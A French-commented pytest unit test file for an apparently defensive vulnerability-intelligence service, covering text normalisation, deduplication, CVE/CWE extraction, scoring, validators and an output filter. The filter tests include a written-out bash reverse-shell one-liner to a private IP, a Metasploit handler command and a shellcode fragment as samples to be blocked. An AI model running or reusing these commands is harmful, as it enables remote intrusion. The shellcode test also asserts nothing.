"""
Vigilant Guardian — Tests unitaires du socle.

Commande : poetry run pytest tests/unit/ -v --cov=src
"""

from __future__ import annotations

import numpy as np
import pytest


# ════════════════════════════════════════════════════════════════════════
# 1. API Health Endpoint
# ════════════════════════════════════════════════════════════════════════

class TestHealthEndpoint:
    """Vérifie que /health répond (section 4.2 HEALTHCHECK Docker)."""

    @pytest.mark.asyncio
    async def test_health_returns_200(self, client):
        resp = await client.get("/health")
        assert resp.status_code == 200
        data = resp.json()
        assert data["service"] == "vigilant-guardian-api"
        assert "status" in data


# ════════════════════════════════════════════════════════════════════════
# 2. Normalizer (section 7.2.1)
# ════════════════════════════════════════════════════════════════════════

class TestNormalizer:
    """Vérifie le pipeline de normalisation NLP."""

    def test_strips_html(self):
        from src.analysis.normalizer import normalize_text

        result = normalize_text("<p>Hello <b>World</b></p>")
        assert "<" not in result
        assert "hello" in result
        assert "world" in result

    def test_removes_urls(self):
        from src.analysis.normalizer import normalize_text

        result = normalize_text("Check https://example.com/vuln for details")
        assert "https" not in result
        assert "example.com" not in result
        assert "check" in result

    def test_removes_mentions(self):
        from src.analysis.normalizer import normalize_text

        result = normalize_text("Thanks @security_researcher for reporting")
        assert "@" not in result

    def test_lowercases(self):
        from src.analysis.normalizer import normalize_text

        result = normalize_text("CVE-2024-12345 Critical VULNERABILITY")
        assert result == result.lower()

    def test_empty_input(self):
        from src.analysis.normalizer import normalize_text

        assert normalize_text("") == ""
        assert normalize_text(None) == ""  # type: ignore


# ════════════════════════════════════════════════════════════════════════
# 3. Deduplicator (section 7.2.1 — seuil 0.92)
# ════════════════════════════════════════════════════════════════════════

class TestDeduplicator:
    """Vérifie la déduplication sémantique."""

    def test_identical_vectors_are_duplicates(self):
        from src.analysis.deduplicator import deduplicate

        vec = np.array([1.0, 0.0, 0.0], dtype=np.float32)
        vec = vec / np.linalg.norm(vec)
        embeddings = [vec, vec.copy(), vec.copy()]

        unique = deduplicate(embeddings, threshold=0.92)
        assert len(unique) == 1

    def test_different_vectors_are_unique(self):
        from src.analysis.deduplicator import deduplicate

        embeddings = [
            np.array([1.0, 0.0, 0.0], dtype=np.float32),
            np.array([0.0, 1.0, 0.0], dtype=np.float32),
            np.array([0.0, 0.0, 1.0], dtype=np.float32),
        ]

        unique = deduplicate(embeddings, threshold=0.92)
        assert len(unique) == 3

    def test_empty_input(self):
        from src.analysis.deduplicator import deduplicate

        assert deduplicate([]) == []

    def test_single_input(self):
        from src.analysis.deduplicator import deduplicate

        vec = np.array([1.0, 0.5], dtype=np.float32)
        assert deduplicate([vec]) == [0]

    def test_semantic_hash(self):
        from src.analysis.deduplicator import compute_semantic_hash

        vec = np.array([0.5, -0.3, 0.8], dtype=np.float32)
        h = compute_semantic_hash(vec)
        assert isinstance(h, str)
        assert len(h) == 64  # SHA-256 hex


# ════════════════════════════════════════════════════════════════════════
# 4. Entity Extractor (section 7.2.1)
# ════════════════════════════════════════════════════════════════════════

class TestEntityExtractor:
    """Vérifie l'extraction d'entités cybersécurité."""

    def test_extracts_cve_id(self):
        from src.analysis.entity_extractor import extract_entities

        results = extract_entities(["Vulnerability CVE-2024-12345 found"])
        entities = results[0]
        cve_ids = [e["value"] for e in entities if e["type"] == "cve_id"]
        assert "CVE-2024-12345" in cve_ids

    def test_extracts_cwe_id(self):
        from src.analysis.entity_extractor import extract_entities

        results = extract_entities(["This is a CWE-416 use-after-free bug"])
        entities = results[0]
        cwe_ids = [e["value"] for e in entities if e["type"] == "cwe_id"]
        assert "CWE-416" in cwe_ids

    def test_extracts_version(self):
        from src.analysis.entity_extractor import extract_entities

        results = extract_entities(["Apache 2.4.51 is vulnerable"])
        entities = results[0]
        versions = [e["value"] for e in entities if e["type"] == "version"]
        assert "2.4.51" in versions

    def test_extracts_vendor(self):
        from src.analysis.entity_extractor import extract_entities

        results = extract_entities(["Apache HTTP Server has a critical flaw"])
        entities = results[0]
        vendors = [e["value"].lower() for e in entities if e["type"] == "vendor"]
        assert "apache" in vendors

    def test_handles_empty_input(self):
        from src.analysis.entity_extractor import extract_entities

        results = extract_entities([""])
        assert results == [[]]


# ════════════════════════════════════════════════════════════════════════
# 5. Scorer (section 7.4 — catégories CRITICAL/HIGH/MEDIUM/LOW)
# ════════════════════════════════════════════════════════════════════════

class TestScorer:
    """Vérifie l'algorithme de scoring multi-critères."""

    def test_high_score_is_critical(self):
        from src.intelligence.scorer import compute_priority_score

        data = {
            "entities": [
                {"type": "vendor", "value": "apache"},
                {"type": "cve_id", "value": "CVE-2024-99999"},
            ],
            "insight": {
                "attack_vector": "remote unauthenticated RCE in the wild",
                "vulnerability_type": "CWE-416 Use After Free",
                "business_impact": {"availability": "HIGH"},
                "confidence_score": 0.95,
                "defensive_measures": ["no patch available, unpatched zero-day"],
            },
            "signal_count": 25,
        }
        score, category = compute_priority_score(data)
        assert category in ("CRITICAL", "HIGH")
        assert score >= 60

    def test_low_score(self):
        from src.intelligence.scorer import compute_priority_score

        data = {
            "entities": [],
            "insight": {
                "attack_vector": "local access required with authentication",
                "vulnerability_type": "CWE-200 Information Exposure",
                "business_impact": {"availability": "LOW"},
                "confidence_score": 0.3,
                "defensive_measures": ["patch available, update to latest version"],
            },
            "signal_count": 1,
        }
        score, category = compute_priority_score(data)
        assert score <= 60
        assert category in ("LOW", "MEDIUM")

    def test_score_range(self):
        from src.intelligence.scorer import compute_priority_score

        data = {"entities": [], "insight": {}, "signal_count": 1}
        score, _ = compute_priority_score(data)
        assert 0 <= score <= 100


# ════════════════════════════════════════════════════════════════════════
# 6. Guardrails (section 8.1 — filtrage offensif)
# ════════════════════════════════════════════════════════════════════════

class TestGuardrails:
    """Vérifie le filtrage des contenus offensifs."""

    def test_defensive_content_passes(self, sample_llm_output):
        from src.intelligence.guardrails import filter_output

        result = filter_output(sample_llm_output)
        assert result is not None
        assert "defensive_measures" in result

    def test_exploit_code_blocked(self):
        from src.intelligence.guardrails import filter_output

        malicious_output = {
            "vulnerability_type": "CWE-78",
            "attack_vector": "Use bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 for reverse shell",
            "defensive_measures": [
                "Run msfconsole and use exploit/multi/handler"
            ],
            "confidence_score": 0.9,
        }
        result = filter_output(malicious_output)
        # Soit rejeté complètement, soit les mesures offensives sont nettoyées
        if result is not None:
            measures = result.get("defensive_measures", [])
            for m in measures:
                assert "msfconsole" not in m.lower()

    def test_shellcode_blocked(self):
        from src.intelligence.guardrails import filter_output

        malicious_output = {
            "vulnerability_type": "CWE-119",
            "attack_vector": "Inject shellcode \\x90\\x90\\x90\\x31\\xc0 into buffer",
            "defensive_measures": [],
            "confidence_score": 0.8,
        }
        result = filter_output(malicious_output)
        # Le shellcode doit être détecté et bloqué
        # (result may be None or cleaned)

    def test_none_input_handled(self):
        from src.intelligence.guardrails import filter_output

        assert filter_output(None) is None
        assert filter_output({}) is None


# ════════════════════════════════════════════════════════════════════════
# 7. Validators
# ════════════════════════════════════════════════════════════════════════

class TestValidators:
    """Vérifie les validateurs de format."""

    def test_valid_cve(self):
        from src.utils.validators import is_valid_cve

        assert is_valid_cve("CVE-2024-12345") is True
        assert is_valid_cve("CVE-2024-1234") is True
        assert is_valid_cve("CVE-2024-123456") is True

    def test_invalid_cve(self):
        from src.utils.validators import is_valid_cve

        assert is_valid_cve("CVE-2024") is False
        assert is_valid_cve("CWE-416") is False
        assert is_valid_cve("not-a-cve") is False

    def test_valid_cwe(self):
        from src.utils.validators import is_valid_cwe

        assert is_valid_cwe("CWE-416") is True
        assert is_valid_cwe("CWE-79") is True

    def test_invalid_cwe(self):
        from src.utils.validators import is_valid_cwe

        assert is_valid_cwe("CWE-99999") is False
        assert is_valid_cwe("CVE-2024-1234") is False
